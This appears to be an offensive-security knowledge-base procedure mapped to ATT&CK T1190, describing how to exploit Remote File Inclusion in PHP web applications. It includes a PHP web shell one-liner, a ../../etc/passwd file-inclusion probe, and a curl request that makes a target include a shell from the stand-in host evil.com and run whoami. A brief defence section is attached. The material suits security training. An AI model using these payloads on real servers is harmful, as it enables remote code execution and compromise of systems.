---
id: 55e4312f-ac9a-4ec2-a926-7f74bb1911da
type: procedure
name: Execute-Basic-Remote-File-Inclusion
verified: true
submitted: false
created_at: '2023-04-06T03:55:58.182364+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Initial Access|TA0001 - Initial Access]]'
techniques:
  - >-
    [[techniques/Exploit Public-Facing Application|T1190 - Exploit Public-Facing
    Application]]
sub_techniques: []
tags:
  - '[[tags/RFI]]'
  - '[[tags/File Inclusion]]'
  - '[[tags/Web Vulnerability]]'
commands:
  - '[[commands/curl-rfi-test]]'
platforms:
  - Web
tools: []
validated: true
---

# Execute-Basic-Remote-File-Inclusion

## Summary

This procedure demonstrates how to exploit a Remote File Inclusion (RFI) vulnerability in a web application to include and execute code from a remote attacker-controlled file, such as a web shell, leading to remote code execution on the server.

## Description

Remote File Inclusion (RFI) occurs when a web application allows user-supplied input to dynamically include files via server-side includes without proper validation. An attacker can manipulate parameters like 'page' or 'file' in URLs to point to external resources hosted on a malicious server. When the vulnerable application fetches and executes this remote file, it can lead to arbitrary code execution, data exfiltration, or further compromise. This is common in legacy PHP applications using functions like include() or require() on untrusted input. The target environment is typically a web server (e.g., Apache/Nginx with PHP) exposed to the internet. Success results in the execution of attacker-supplied code, such as a simple web shell for command execution.

## Requirements

1. A vulnerable web application with an RFI flaw (e.g., parameter allowing remote file paths without validation).
2. Attacker-controlled server to host the malicious file (e.g., a simple text file containing PHP code like <?php system($_GET['cmd']); ?>).
3. Network access to both the target application and the attacker's hosting server.
4. Tools like curl or a browser for testing the inclusion.

## Defense

- Implement strict input validation and sanitization to whitelist allowed file paths and block external URLs.
- Use security headers like Content-Security-Policy and disable allow_url_include in PHP configurations.
- Regularly scan for vulnerabilities using tools like OWASP ZAP or Burp Suite, and apply patches.
- Monitor web server logs for anomalous requests containing external domains or unusual file paths.

## Objectives

1. Identify and confirm the RFI vulnerability in the target application.
2. Host and deliver a malicious remote file to achieve code execution.
3. Gain initial remote code execution on the web server for further exploitation.

## Instructions

### Step 1: Identify the Vulnerable Parameter

**Context**: Examine the web application's URL structure to find parameters that control file inclusion, such as 'page', 'file', or 'include'. Test with local files first (e.g., ?page=../../etc/passwd) to confirm Local File Inclusion (LFI), then escalate to remote by prepending http://.

Use manual testing or a proxy tool to intercept and modify requests. Look for error messages revealing inclusion attempts.

### Step 2: Host the Malicious Remote File

**Context**: Create and host a simple web shell on an attacker-controlled server. The file should contain executable code, such as a PHP one-liner for command execution. Ensure the server allows direct file access (e.g., via HTTP).

Example malicious file content (shell.txt): <?php system($_GET['cmd']); ?>

Upload this to a web-accessible location on your server, e.g., http://evil.com/shell.txt.

### Step 3: Craft and Execute the RFI Request

**Context**: Construct a URL that injects the remote file path into the vulnerable parameter. Send the request to trigger inclusion and execution. Verify by appending a command parameter if using a shell.

**Command** ([[commands/curl-rfi-test]]):
```bash
curl "http://example.com/index.php?page=http://evil.com/shell.txt?cmd=whoami"
```

> This command sends an HTTP GET request to the vulnerable endpoint, replacing the 'page' parameter with the remote shell URL. The optional ?cmd=whoami tests execution by running a command on the server. Expected output includes the result of the command (e.g., web server user like 'www-data') if successful, or the shell's response.
